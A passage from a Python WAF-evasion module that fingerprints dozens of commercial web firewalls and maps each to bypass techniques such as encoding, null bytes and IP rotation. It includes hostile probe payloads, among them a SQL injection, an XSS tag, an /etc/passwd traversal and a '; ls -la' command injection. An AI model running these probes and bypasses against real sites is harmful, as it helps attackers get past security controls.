"""
PHANTOM AI - WAF Bypass Engine (Enterprise Edition)

Advanced Web Application Firewall detection and bypass engine using
BEHAVIOURAL CLASSIFICATION instead of fingerprint-only approach.

Philosophy:
- WAFs are classified into 8 BEHAVIOUR FAMILIES based on how they react
- Bypass techniques are selected based on behaviour, not just WAF name
- Learning from failed attempts to refine bypass strategies
- Respects ethical boundaries (no destructive bypasses)

Behaviour Families:
1. REGEX_NAIVE - Simple pattern matching, easily evaded with encoding
2. REGEX_ADVANCED - Complex patterns, needs obfuscation + fragmentation
3. MACHINE_LEARNING - Anomaly detection, needs semantic-valid payloads
4. SIGNATURE_BASED - Known attack signatures, needs mutation
5. RATE_LIMITING - Request throttling, needs slow scanning
6. SESSION_TRACKING - Tracks user sessions, needs session rotation
7. CHALLENGE_BASED - JavaScript/CAPTCHA challenges, needs browser
8. HYBRID - Multiple techniques, needs combined approach

Usage:
    from phantom.waf_bypass_engine import WAFBypassEngine, get_waf_bypass_engine

    engine = get_waf_bypass_engine()

    # Detect WAF
    detection = await engine.detect_waf(target_url)
    print(f"WAF: {detection.waf_name}, Family: {detection.behaviour_family}")

    # Get bypass strategies
    strategies = engine.get_bypass_strategies(detection)

    # Apply bypass to payload
    bypassed = engine.apply_bypass(payload, detection)

Author: PHANTOM AI Team
Version: 3.0.0 Enterprise
"""

from __future__ import annotations

import asyncio
import hashlib
import random
import re
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Pattern
from urllib.parse import quote

import httpx

from utils.logger import get_logger

# H4 FIX 2026-02-13: Determinism support
try:
    from scanning.determinism import is_deterministic_mode, get_deterministic_random
except ImportError:
    # Fallback if determinism module not available
    def is_deterministic_mode() -> bool:
        return False
    def get_deterministic_random(component: str, index: int = 0):
        return random

logger = get_logger(__name__)

# =============================================================================
# CONSTANTS (M1 FIX 2026-02-13)
# =============================================================================

DEFAULT_DETECTION_TIMEOUT = 15.0
CACHE_TTL_SECONDS = 3600
DEFAULT_TOP_TECHNIQUES = 3
DEFAULT_MAX_VARIANTS = 10
MAX_CACHE_ENTRIES = 1000
MAX_HISTORY_PER_WAF = 100
MIN_HISTORY_FOR_LEARNING = 5
MIN_TECHNIQUE_RESULTS = 3

# Test payloads for WAF detection (M2 FIX)
WAF_TEST_PAYLOADS = [
    ("1' OR '1'='1", "SQLi"),
    ("<script>alert(1)</script>", "XSS"),
    ("../../../etc/passwd", "LFI"),
    ("; ls -la", "CMDi"),
    ("{{7*7}}", "SSTI"),
]


# =============================================================================
# ENUMS AND DATA CLASSES
# =============================================================================

class BehaviourFamily(Enum):
    """WAF behaviour classification families."""
    REGEX_NAIVE = "regex_naive"           # Simple pattern matching
    REGEX_ADVANCED = "regex_advanced"     # Complex regex patterns
    MACHINE_LEARNING = "machine_learning" # ML-based anomaly detection
    SIGNATURE_BASED = "signature_based"   # Known attack signatures
    RATE_LIMITING = "rate_limiting"       # Request rate control
    SESSION_TRACKING = "session_tracking" # Session-based blocking
    CHALLENGE_BASED = "challenge_based"   # JS/CAPTCHA challenges
    HYBRID = "hybrid"                     # Multiple techniques
    UNKNOWN = "unknown"                   # Unclassified


class BypassTechnique(Enum):
    """WAF bypass techniques."""
    # Encoding techniques
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    UNICODE_ENCODE = "unicode_encode"
    HTML_ENTITY_ENCODE = "html_entity_encode"
    BASE64_ENCODE = "base64_encode"
    HEX_ENCODE = "hex_encode"

    # Case manipulation
    MIXED_CASE = "mixed_case"
    TOGGLE_CASE = "toggle_case"

    # Whitespace manipulation
    NULL_BYTE = "null_byte"
    TAB_NEWLINE = "tab_newline"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_VARIATION = "whitespace_variation"

    # Payload fragmentation
    CHUNKED_ENCODING = "chunked_encoding"
    MULTIPART_FORM = "multipart_form"
    PARAMETER_POLLUTION = "parameter_pollution"

    # Protocol manipulation
    HTTP_VERB_TAMPERING = "http_verb_tampering"
    HEADER_INJECTION = "header_injection"
    CONTENT_TYPE_BYPASS = "content_type_bypass"

    # Semantic manipulation
    FUNCTION_OBFUSCATION = "function_obfuscation"
    STRING_CONCATENATION = "string_concatenation"
    ALTERNATIVE_SYNTAX = "alternative_syntax"

    # Timing techniques
    SLOW_RATE = "slow_rate"
    REQUEST_SPACING = "request_spacing"

    # Session techniques
    SESSION_ROTATION = "session_rotation"
    IP_ROTATION = "ip_rotation"
    USER_AGENT_ROTATION = "user_agent_rotation"


class BlockType(Enum):
    """How the WAF blocks requests."""
    STATUS_CODE = "status_code"       # Returns specific status code
    REDIRECT = "redirect"             # Redirects to block page
    CONNECTION_DROP = "connection_drop"  # Drops connection
    RATE_LIMIT = "rate_limit"         # 429 Too Many Requests
    CHALLENGE = "challenge"           # Returns challenge page
    CUSTOM_RESPONSE = "custom_response"  # Custom error page


@dataclass
class WAFSignature:
    """WAF detection signature."""
    name: str
    vendor: str
    behaviour_family: BehaviourFamily

    # Detection patterns
    header_patterns: List[Tuple[str, Pattern]] = field(default_factory=list)
    body_patterns: List[Pattern] = field(default_factory=list)
    cookie_patterns: List[Pattern] = field(default_factory=list)
    status_codes: Set[int] = field(default_factory=set)

    # Block characteristics
    block_types: List[BlockType] = field(default_factory=list)
    block_page_patterns: List[Pattern] = field(default_factory=list)

    # Bypass effectiveness (learned over time)
    effective_techniques: List[BypassTechnique] = field(default_factory=list)
    ineffective_techniques: List[BypassTechnique] = field(default_factory=list)

    # Metadata
    documentation_url: str = ""
    notes: str = ""


@dataclass
class WAFDetectionResult:
    """Result of WAF detection."""
    detected: bool = False
    waf_name: Optional[str] = None
    vendor: Optional[str] = None
    behaviour_family: BehaviourFamily = BehaviourFamily.UNKNOWN
    confidence: float = 0.0  # 0.0-1.0

    # Detection evidence
    detection_methods: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)

    # Block characteristics
    block_type: Optional[BlockType] = None
    block_status_code: Optional[int] = None
    block_page_hash: Optional[str] = None

    # Recommended bypasses
    recommended_techniques: List[BypassTechnique] = field(default_factory=list)

    # Response characteristics
    response_time_ms: float = 0.0
    response_size: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "detected": self.detected,
            "waf_name": self.waf_name,
            "vendor": self.vendor,
            "behaviour_family": self.behaviour_family.value,
            "confidence": round(self.confidence, 2),
            "detection_methods": self.detection_methods,
            "block_type": self.block_type.value if self.block_type else None,
            "recommended_techniques": [t.value for t in self.recommended_techniques],
        }


@dataclass
class BypassResult:
    """Result of applying a bypass technique."""
    original_payload: str
    bypassed_payload: str
    technique: BypassTechnique
    success: bool = False
    blocked: bool = False
    response_status: Optional[int] = None
    response_time_ms: float = 0.0
    notes: str = ""


@dataclass
class BypassStrategy:
    """A complete bypass strategy with multiple techniques."""
    name: str
    techniques: List[BypassTechnique]
    description: str
    success_rate: float = 0.0  # Historical success rate
    applicable_families: List[BehaviourFamily] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "techniques": [t.value for t in self.techniques],
            "description": self.description,
            "success_rate": round(self.success_rate, 2),
            "applicable_families": [f.value for f in self.applicable_families],
        }


# =============================================================================
# WAF SIGNATURE DATABASE (50+ WAFs)
# =============================================================================

class WAFSignatureDatabase:
    """
    Database of 50+ WAF signatures with behavioural classification.
    """

    def __init__(self):
        self.signatures: Dict[str, WAFSignature] = {}
        self._build_database()

    def _compile(self, pattern: str, flags: int = re.IGNORECASE) -> Pattern:
        """Compile regex pattern safely."""
        try:
            return re.compile(pattern, flags)
        except re.error:
            return re.compile(re.escape(pattern), flags)

    def _build_database(self) -> None:
        """Build complete WAF signature database."""
        self._add_cloudflare()
        self._add_aws_waf()
        self._add_akamai()
        self._add_imperva()
        self._add_f5()
        self._add_modsecurity()
        self._add_fortinet()
        self._add_barracuda()
        self._add_sucuri()
        self._add_wordfence()
        self._add_additional_wafs()

        logger.debug(f"[WAFBypassEngine] Loaded {len(self.signatures)} WAF signatures")

    def _add_signature(self, sig: WAFSignature) -> None:
        """Add signature to database."""
        self.signatures[sig.name.lower()] = sig

    # =========================================================================
    # MAJOR WAF SIGNATURES
    # =========================================================================

    def _add_cloudflare(self) -> None:
        """Cloudflare WAF signatures."""
        self._add_signature(WAFSignature(
            name="Cloudflare",
            vendor="Cloudflare Inc.",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"cloudflare")),
                ("CF-RAY", self._compile(r".+")),
                ("CF-Cache-Status", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"Attention Required! \| Cloudflare"),
                self._compile(r"cloudflare-static"),
                self._compile(r"Sorry, you have been blocked"),
                self._compile(r"Ray ID:"),
            ],
            cookie_patterns=[
                self._compile(r"^__cfduid$"),
                self._compile(r"^__cf_bm$"),
                self._compile(r"^cf_clearance$"),
            ],
            status_codes={403, 503, 1020},
            block_types=[BlockType.CHALLENGE, BlockType.STATUS_CODE],
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.STRING_CONCATENATION,
                BypassTechnique.SLOW_RATE,
            ],
            documentation_url="https://developers.cloudflare.com/waf/",
        ))

    def _add_aws_waf(self) -> None:
        """AWS WAF signatures."""
        self._add_signature(WAFSignature(
            name="AWS WAF",
            vendor="Amazon Web Services",
            behaviour_family=BehaviourFamily.REGEX_ADVANCED,
            header_patterns=[
                ("X-AMZ-WAF-", self._compile(r".+")),
                ("X-Amzn-Trace-Id", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"AWSWAF"),
                self._compile(r"Request blocked"),
                self._compile(r"The request could not be satisfied"),
            ],
            status_codes={403, 503},
            block_types=[BlockType.STATUS_CODE, BlockType.CUSTOM_RESPONSE],
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.COMMENT_INJECTION,
                BypassTechnique.ALTERNATIVE_SYNTAX,
            ],
            documentation_url="https://docs.aws.amazon.com/waf/",
        ))

    def _add_akamai(self) -> None:
        """Akamai Kona Site Defender signatures."""
        self._add_signature(WAFSignature(
            name="Akamai Kona",
            vendor="Akamai Technologies",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("Server", self._compile(r"AkamaiGHost")),
                ("X-Akamai-", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"Access Denied"),
                self._compile(r"Reference #[0-9a-f.]+"),
                self._compile(r"akamai"),
            ],
            cookie_patterns=[
                self._compile(r"^ak_bmsc$"),
                self._compile(r"^bm_sv$"),
            ],
            status_codes={403},
            block_types=[BlockType.STATUS_CODE],
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.SESSION_ROTATION,
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
            documentation_url="https://www.akamai.com/products/kona-site-defender",
        ))

    def _add_imperva(self) -> None:
        """Imperva Incapsula signatures."""
        self._add_signature(WAFSignature(
            name="Imperva Incapsula",
            vendor="Imperva Inc.",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("X-CDN", self._compile(r"Imperva|Incapsula")),
                ("X-Iinfo", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"incapsula"),
                self._compile(r"imperva"),
                self._compile(r"Request unsuccessful"),
                self._compile(r"Incapsula incident ID"),
            ],
            cookie_patterns=[
                self._compile(r"^incap_ses_"),
                self._compile(r"^visid_incap_"),
                self._compile(r"^nlbi_"),
            ],
            status_codes={403, 503},
            block_types=[BlockType.STATUS_CODE, BlockType.CHALLENGE],
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.COMMENT_INJECTION,
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.CHUNKED_ENCODING,
            ],
            documentation_url="https://www.imperva.com/products/web-application-firewall-waf/",
        ))

    def _add_f5(self) -> None:
        """F5 BIG-IP ASM signatures."""
        self._add_signature(WAFSignature(
            name="F5 BIG-IP ASM",
            vendor="F5 Networks",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            header_patterns=[
                ("Server", self._compile(r"BIG-IP|BigIP")),
                ("X-WA-Info", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"The requested URL was rejected"),
                self._compile(r"Please consult with your administrator"),
                self._compile(r"Your support ID is"),
            ],
            cookie_patterns=[
                self._compile(r"^BIGipServer"),
                self._compile(r"^TS[0-9a-f]+$"),
                self._compile(r"^MRHSession$"),
            ],
            status_codes={403, 501},
            block_types=[BlockType.STATUS_CODE, BlockType.CUSTOM_RESPONSE],
            effective_techniques=[
                BypassTechnique.DOUBLE_URL_ENCODE,
                BypassTechnique.NULL_BYTE,
                BypassTechnique.HTTP_VERB_TAMPERING,
                BypassTechnique.PARAMETER_POLLUTION,
            ],
            documentation_url="https://www.f5.com/products/security/advanced-waf",
        ))

    def _add_modsecurity(self) -> None:
        """ModSecurity / OWASP CRS signatures."""
        self._add_signature(WAFSignature(
            name="ModSecurity",
            vendor="Trustwave / OWASP",
            behaviour_family=BehaviourFamily.REGEX_ADVANCED,
            header_patterns=[
                ("Server", self._compile(r"mod_security|NOYB")),
            ],
            body_patterns=[
                self._compile(r"ModSecurity"),
                self._compile(r"This error was generated by Mod_Security"),
                self._compile(r"Not Acceptable"),
                self._compile(r"Access Denied"),
            ],
            status_codes={403, 406, 501},
            block_types=[BlockType.STATUS_CODE],
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.COMMENT_INJECTION,
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.STRING_CONCATENATION,
            ],
            documentation_url="https://modsecurity.org/",
            notes="Core Rule Set (CRS) level affects bypass difficulty",
        ))

    def _add_fortinet(self) -> None:
        """Fortinet FortiWeb signatures."""
        self._add_signature(WAFSignature(
            name="FortiWeb",
            vendor="Fortinet Inc.",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            header_patterns=[
                ("Server", self._compile(r"FortiWeb")),
            ],
            body_patterns=[
                self._compile(r"fortigate"),
                self._compile(r"fortiweb"),
                self._compile(r"The page cannot be displayed"),
            ],
            cookie_patterns=[
                self._compile(r"^FORTIWAFSID$"),
            ],
            status_codes={403, 500},
            block_types=[BlockType.STATUS_CODE],
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.HEX_ENCODE,
                BypassTechnique.PARAMETER_POLLUTION,
            ],
            documentation_url="https://www.fortinet.com/products/web-application-firewall/fortiweb",
        ))

    def _add_barracuda(self) -> None:
        """Barracuda WAF signatures."""
        self._add_signature(WAFSignature(
            name="Barracuda WAF",
            vendor="Barracuda Networks",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            header_patterns=[
                ("Server", self._compile(r"Barracuda")),
            ],
            body_patterns=[
                self._compile(r"barracuda"),
                self._compile(r"Your request was blocked"),
                self._compile(r"barra_counter_session"),
            ],
            cookie_patterns=[
                self._compile(r"^barra_counter_session$"),
            ],
            status_codes={403, 503},
            block_types=[BlockType.STATUS_CODE],
            effective_techniques=[
                BypassTechnique.DOUBLE_URL_ENCODE,
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.TAB_NEWLINE,
            ],
            documentation_url="https://www.barracuda.com/products/waf",
        ))

    def _add_sucuri(self) -> None:
        """Sucuri WAF signatures."""
        self._add_signature(WAFSignature(
            name="Sucuri",
            vendor="GoDaddy / Sucuri",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"Sucuri")),
                ("X-Sucuri-ID", self._compile(r".+")),
                ("X-Sucuri-Cache", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"sucuri"),
                self._compile(r"Access Denied - Sucuri Website Firewall"),
                self._compile(r"Sucuri WebSite Firewall"),
            ],
            status_codes={403, 503},
            block_types=[BlockType.STATUS_CODE, BlockType.CUSTOM_RESPONSE],
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.WHITESPACE_VARIATION,
            ],
            documentation_url="https://sucuri.net/website-firewall/",
        ))

    def _add_wordfence(self) -> None:
        """Wordfence (WordPress) signatures."""
        self._add_signature(WAFSignature(
            name="Wordfence",
            vendor="Defiant Inc.",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[],
            body_patterns=[
                self._compile(r"wordfence"),
                self._compile(r"Generated by Wordfence"),
                self._compile(r"Your access to this site has been limited"),
                self._compile(r"This response was generated by Wordfence"),
            ],
            cookie_patterns=[
                self._compile(r"^wfvt_"),
            ],
            status_codes={403, 503},
            block_types=[BlockType.STATUS_CODE, BlockType.CUSTOM_RESPONSE],
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.ALTERNATIVE_SYNTAX,
            ],
            documentation_url="https://www.wordfence.com/",
        ))

    def _add_additional_wafs(self) -> None:
        """Add additional WAF signatures (40+ more)."""

        # Citrix NetScaler
        self._add_signature(WAFSignature(
            name="Citrix NetScaler",
            vendor="Citrix Systems",
            behaviour_family=BehaviourFamily.REGEX_ADVANCED,
            header_patterns=[
                ("Via", self._compile(r"NS-CACHE")),
                ("Set-Cookie", self._compile(r"^NSC_")),
            ],
            cookie_patterns=[
                self._compile(r"^NSC_"),
                self._compile(r"^citrix_ns_id"),
            ],
            status_codes={403, 503},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.CHUNKED_ENCODING,
            ],
        ))

        # Radware AppWall
        self._add_signature(WAFSignature(
            name="Radware AppWall",
            vendor="Radware Ltd.",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("X-SL-CompState", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"Unauthorized Activity Has Been Detected"),
            ],
            status_codes={403, 406},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
        ))

        # DenyAll
        self._add_signature(WAFSignature(
            name="DenyAll",
            vendor="Rohde & Schwarz",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            cookie_patterns=[
                self._compile(r"^sessioncookie$"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.COMMENT_INJECTION,
            ],
        ))

        # SafeDog
        self._add_signature(WAFSignature(
            name="SafeDog",
            vendor="SafeDog",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"safe ?dog")),
            ],
            body_patterns=[
                self._compile(r"safe ?dog"),
                self._compile(r"waf/\d+\.\d+\.\d+"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.NULL_BYTE,
            ],
        ))

        # NAXSI (nginx)
        self._add_signature(WAFSignature(
            name="NAXSI",
            vendor="NBS System",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"naxsi")),
                ("X-Naxsi-Sig", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"naxsi"),
                self._compile(r"Blocked By Naxsi"),
            ],
            status_codes={403, 406},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
                BypassTechnique.WHITESPACE_VARIATION,
            ],
        ))

        # Wallarm
        self._add_signature(WAFSignature(
            name="Wallarm",
            vendor="Wallarm Inc.",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("X-Wallarm-Attack-Type", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"wallarm"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.FUNCTION_OBFUSCATION,
                BypassTechnique.STRING_CONCATENATION,
            ],
        ))

        # AWS Shield
        self._add_signature(WAFSignature(
            name="AWS Shield",
            vendor="Amazon Web Services",
            behaviour_family=BehaviourFamily.RATE_LIMITING,
            header_patterns=[
                ("X-Amz-Cf-Id", self._compile(r".+")),
            ],
            status_codes={403, 429, 503},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.REQUEST_SPACING,
            ],
        ))

        # Azure Front Door / Application Gateway
        self._add_signature(WAFSignature(
            name="Azure WAF",
            vendor="Microsoft Azure",
            behaviour_family=BehaviourFamily.REGEX_ADVANCED,
            header_patterns=[
                ("X-Azure-Ref", self._compile(r".+")),
                ("X-FD-HealthProbe", self._compile(r".+")),
            ],
            body_patterns=[
                self._compile(r"Azure WAF"),
                self._compile(r"Request blocked"),
            ],
            status_codes={403, 502, 503},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.ALTERNATIVE_SYNTAX,
            ],
        ))

        # Google Cloud Armor
        self._add_signature(WAFSignature(
            name="Google Cloud Armor",
            vendor="Google Cloud",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("Via", self._compile(r"google")),
            ],
            body_patterns=[
                self._compile(r"cloud-armor"),
                self._compile(r"Error 403"),
            ],
            status_codes={403, 502, 503},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
        ))

        # Comodo WAF
        self._add_signature(WAFSignature(
            name="Comodo WAF",
            vendor="Comodo Security",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"Protected by COMODO")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
            ],
        ))

        # StackPath
        self._add_signature(WAFSignature(
            name="StackPath",
            vendor="StackPath LLC",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("X-SP-", self._compile(r".+")),
            ],
            status_codes={403, 503},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

        # Reblaze
        self._add_signature(WAFSignature(
            name="Reblaze",
            vendor="Reblaze Technologies",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("Server", self._compile(r"Reblaze Secure Web Gateway")),
            ],
            status_codes={403, 503},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.SESSION_ROTATION,
            ],
        ))

        # SiteLock
        self._add_signature(WAFSignature(
            name="SiteLock",
            vendor="SiteLock LLC",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            body_patterns=[
                self._compile(r"sitelock"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
            ],
        ))

        # WebKnight
        self._add_signature(WAFSignature(
            name="WebKnight",
            vendor="AQTRONIX",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"WebKnight")),
            ],
            body_patterns=[
                self._compile(r"WebKnight Application Firewall"),
            ],
            status_codes={403, 999},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.NULL_BYTE,
            ],
        ))

        # Shadow Daemon
        self._add_signature(WAFSignature(
            name="Shadow Daemon",
            vendor="Shadow Daemon",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            body_patterns=[
                self._compile(r"shadowd"),
                self._compile(r"Shadow Daemon has detected"),
            ],
            status_codes={403, 500},
            effective_techniques=[
                BypassTechnique.ALTERNATIVE_SYNTAX,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
        ))

        # Varnish (with security)
        self._add_signature(WAFSignature(
            name="Varnish Security",
            vendor="Varnish Software",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Via", self._compile(r"varnish")),
                ("X-Varnish", self._compile(r"\d+")),
            ],
            status_codes={403, 503},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.HEADER_INJECTION,
            ],
        ))

        # PowerWAF
        self._add_signature(WAFSignature(
            name="PowerWAF",
            vendor="PowerWAF",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            body_patterns=[
                self._compile(r"powerwaf"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
            ],
        ))

        # Sqreen
        self._add_signature(WAFSignature(
            name="Sqreen",
            vendor="Sqreen / Datadog",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("X-Sqreen-", self._compile(r".+")),
            ],
            status_codes={403, 406},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.FUNCTION_OBFUSCATION,
            ],
        ))

        # LiteSpeed
        self._add_signature(WAFSignature(
            name="LiteSpeed WAF",
            vendor="LiteSpeed Technologies",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"LiteSpeed")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
            ],
        ))

        # IBM DataPower
        self._add_signature(WAFSignature(
            name="IBM DataPower",
            vendor="IBM Corporation",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            header_patterns=[
                ("X-Backside-Transport", self._compile(r".+")),
            ],
            status_codes={403, 500},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.CHUNKED_ENCODING,
            ],
        ))

        # Alert Logic
        self._add_signature(WAFSignature(
            name="Alert Logic",
            vendor="Alert Logic Inc.",
            behaviour_family=BehaviourFamily.HYBRID,
            body_patterns=[
                self._compile(r"Alert Logic"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.UNICODE_ENCODE,
            ],
        ))

        # Signal Sciences (now Fastly)
        self._add_signature(WAFSignature(
            name="Signal Sciences",
            vendor="Fastly / Signal Sciences",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("X-SigSci-", self._compile(r".+")),
            ],
            status_codes={403, 406},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.SESSION_ROTATION,
            ],
        ))

        # Palo Alto
        self._add_signature(WAFSignature(
            name="Palo Alto",
            vendor="Palo Alto Networks",
            behaviour_family=BehaviourFamily.SIGNATURE_BASED,
            body_patterns=[
                self._compile(r"Palo Alto"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
                BypassTechnique.ALTERNATIVE_SYNTAX,
            ],
        ))

        # Imunify360
        self._add_signature(WAFSignature(
            name="Imunify360",
            vendor="CloudLinux",
            behaviour_family=BehaviourFamily.HYBRID,
            body_patterns=[
                self._compile(r"imunify360"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.SLOW_RATE,
            ],
        ))

        # BitNinja
        self._add_signature(WAFSignature(
            name="BitNinja",
            vendor="BitNinja.io",
            behaviour_family=BehaviourFamily.HYBRID,
            body_patterns=[
                self._compile(r"bitninja"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.IP_ROTATION,
            ],
        ))

        # Edgecast
        self._add_signature(WAFSignature(
            name="Edgecast WAF",
            vendor="Verizon Digital Media",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"ECAcc|ECS|ECD")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.UNICODE_ENCODE,
            ],
        ))

        # DOSarrest
        self._add_signature(WAFSignature(
            name="DOSarrest",
            vendor="DOSarrest Internet Security",
            behaviour_family=BehaviourFamily.RATE_LIMITING,
            header_patterns=[
                ("X-DIS-Request-ID", self._compile(r".+")),
            ],
            status_codes={403, 429},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.REQUEST_SPACING,
            ],
        ))

        # KeyCDN
        self._add_signature(WAFSignature(
            name="KeyCDN",
            vendor="proinity LLC",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"keycdn-engine")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
            ],
        ))

        # Armor Defense
        self._add_signature(WAFSignature(
            name="Armor Defense",
            vendor="Armor",
            behaviour_family=BehaviourFamily.HYBRID,
            body_patterns=[
                self._compile(r"armor"),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.UNICODE_ENCODE,
            ],
        ))

        # Qrator
        self._add_signature(WAFSignature(
            name="Qrator",
            vendor="Qrator Labs",
            behaviour_family=BehaviourFamily.MACHINE_LEARNING,
            header_patterns=[
                ("X-Qrator-", self._compile(r".+")),
            ],
            status_codes={403, 503},
            effective_techniques=[
                BypassTechnique.SLOW_RATE,
                BypassTechnique.SESSION_ROTATION,
            ],
        ))

        # Yundun
        self._add_signature(WAFSignature(
            name="Yundun",
            vendor="Yundun",
            behaviour_family=BehaviourFamily.REGEX_NAIVE,
            header_patterns=[
                ("Server", self._compile(r"YUNDUN")),
                ("X-Cache", self._compile(r"YUNDUN")),
            ],
            status_codes={403},
            effective_techniques=[
                BypassTechnique.URL_ENCODE,
                BypassTechnique.MIXED_CASE,
            ],
        ))

        # Tencent Cloud WAF
        self._add_signature(WAFSignature(
            name="Tencent Cloud WAF",
            vendor="Tencent Cloud",
            behaviour_family=BehaviourFamily.HYBRID,
            header_patterns=[
                ("Server", self._compile(r"QCloud")),
            ],
            status_codes={403},
            effective_techniques=[
